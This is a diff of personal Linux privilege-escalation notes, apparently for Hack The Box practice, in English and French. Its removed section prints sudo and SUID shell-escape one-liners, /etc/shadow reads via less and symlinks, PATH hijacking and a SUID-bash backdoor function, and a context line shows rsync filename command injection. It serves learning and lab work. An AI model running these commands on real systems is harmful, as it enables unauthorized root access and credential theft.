@@ -1,9 +1,5 @@
 # Privilege Escalation
 
-## To add
-
-hashes of passwd
-
 ## Disclaimer / Explanation
 
 I know linpeas & linenum are good priv esc scripts, but as i'm new to that, all this information kinds of overwhelm me. I prefer to do it step by step myself.
@@ -59,11 +55,24 @@ Check what you can run with `sudo -l` :
 
 ## SUID
 
-See if you can hijack them in any way \(i'll give example later\)
+Check if any program has the suid bit set when they shouldn't, you may be able to hijack a cmd.
 
 ```bash
-find / -perm -4000 2>/dev/null #Find all SUID binaries
+find / -perm -4000 2> /dev/null #Find all SUID binaries
+find / -perm -2000 2> /dev/null # Find all SGID binaries
 ```
+
+### Lib
+
+{% hint style="info" %}
+There's some vuln with librairies, but i'll wait to stumble upon it to detail/verify/re-word it.
+
+Check :
+
+* [https://book.hacktricks.xyz/linux-unix/privilege-escalation\#ld\_preload](https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld_preload)
+* [https://book.hacktricks.xyz/linux-unix/privilege-escalation\#suid-binary-so-injection](https://book.hacktricks.xyz/linux-unix/privilege-escalation#suid-binary-so-injection)
+* [https://book.hacktricks.xyz/linux-unix/privilege-escalation\#etc-ld-so-conf-d](https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d)
+{% endhint %}
 
 ## Exploit groups
 
@@ -130,78 +139,6 @@ rsync -a *.sh rsync://host.back/src/rbd
 # Create a file called "-e sh myscript.sh" to have the script execute our file
 ```
 
-## Commands with sudo and suid commands
-
-You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:
-
-```bash
-sudo -l #Check commands you can execute with sudo
-find / -perm -4000 2>/dev/null #Find all SUID binaries
-```
-
-Some **unexpected commands allows you to read and/or write files or even execute command.** For example:
-
-```bash
-sudo awk 'BEGIN {system("/bin/sh")}'
-sudo find /etc -exec sh -i \;
-sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
-sudo tar c a.tar -I ./runme.sh a
-ftp>!/bin/sh
-less>! <shell_comand>
-```
-
-{% embed url="https://gtfobins.github.io/" %}
-
-### Sudo execution bypassing paths
-
-**Jump** to read other files or use **symlinks**. For example in sudeores file: _hacker10 ALL= \(root\) /bin/less /var/log/\*_
-
-```bash
-sudo less /var/logs/anything
-less>:e /etc/shadow #Jump to read other files using privileged less
-```
-
-```bash
-ln /etc/shadow /var/log/new
-sudo less /var/log/new #Use symlinks to read any file
-```
-
-If a **wilcard** is used \(\*\), it is even easier:
-
-```bash
-sudo less /var/log/../../etc/shadow #Read shadow
-sudo less /var/log/something /etc/shadow #Red 2 files
-```
-
-**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)
-
-### Sudo command/SUID binary without command path
-
-If the **sudo permission** is given to a single command **without specifying the path**: _hacker10 ALL= \(root\) less_ you can exploit it by changing the PATH variable
-
-```bash
-export PATH=/tmp:$PATH
-#Put your backdoor in /tmp and name it "less"
-sudo less
-```
-
-This technique can also be used if a **suid** binary **executes another command without specifying the path to it \(always check with** _**strings**_ **the content of a weird SUID binary\)**.
-
-[Payload examples to execute.]()
-
-### SUID binary with command path
-
-If the **suid** binary **executes another command specifying the path**, then, you can try to **export a function** named as the command that the suid file is calling.
-
-For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
-
-```bash
-function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
-export -f /usr/sbin/service
-```
-
-Then, when you call the suid binary, this function will be executed
-
 ## Software exploit
 
 ```bash
@@ -211,20 +148,29 @@ rpm -qa #Centos
 
 If you have SSH access you can also use **openVAS** to check for vulnerable software.
 
+## Open Shell Session
+
+
+
 ## Hack the box
 
 J'utilise évidemment les scripts, mais je voulais noter ici les éléments spécifiques à chercher pour résoudre certaines boxes.
 
 * Fichiers `.bak` sensible ?
 * **Ports** ouverts sur localhost ? \(Port forward si besoin\)
-* Un job **cron** lancé par un utilisateur aura ces droits, donc si on arrive à faire en sorte que ce qu'il appelle lance un shell, on en aura un avec des droits
 * Obtenir la liste de tout les fichiers own par root mais n'appartenant pas au groupe de root \(script custom\) : `find / -user root ! -group root -ls 2> /dev/null`
   * Si on arrive à devenir un des membres d'un de ces groupes et si un de ces fichiers nous permet de lancer une commande, celle-ci sera lancée en tant que root 
 * Si on y a accès, check `.bash_history` pour voir s'il ne leak pas des mdp ou des fichiers intéressants
 * Si on arrive sur un **serveur web,** chercher le fichier de config de la db et tenter de se co pour ensuite explorer les tables d'utilisateurs & co
 * Si un script change les droits d'un fichier, si on fait un **lien symbolique** entre ce nom de fichier et un fichier qui nous intéresse, cela changera aussi les droits du fichier qui nous intéresse.
 
+## To add
 
+### Capabilities
+
+It seem a bit advance & specific, but might be interesting. Check [https://book.hacktricks.xyz/linux-unix/privilege-escalation\#capabilities](https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities)
+
+### Password hash
 
 ## Sources
 
